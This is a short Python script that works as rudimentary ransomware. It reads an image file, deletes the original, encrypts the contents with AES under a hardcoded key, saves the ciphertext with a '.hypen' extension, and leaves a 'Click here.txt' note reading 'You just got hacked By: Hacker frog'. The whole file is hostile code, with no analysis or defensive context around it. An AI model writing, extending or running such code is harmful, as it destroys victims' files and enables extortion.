import os
import binascii
import pyaes


fileImg= "images.jpg"
new_fileImg=fileImg + ".hypen"
key = b"sadftgbsdftghjut"



file = open(fileImg,"rb")
file_data=file.read()
file.close()
os.remove(fileImg)



aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
crypto_data_hex = binascii.hexlify(crypto_data)



new_file = open(new_fileImg,"wb")
new_file.write(crypto_data)
new_file.close()



text = b"You just got hacked \n By: Hacker frog"

text
file_text = open("Click here.txt","wb")
file_text.write(text)
file_text.close()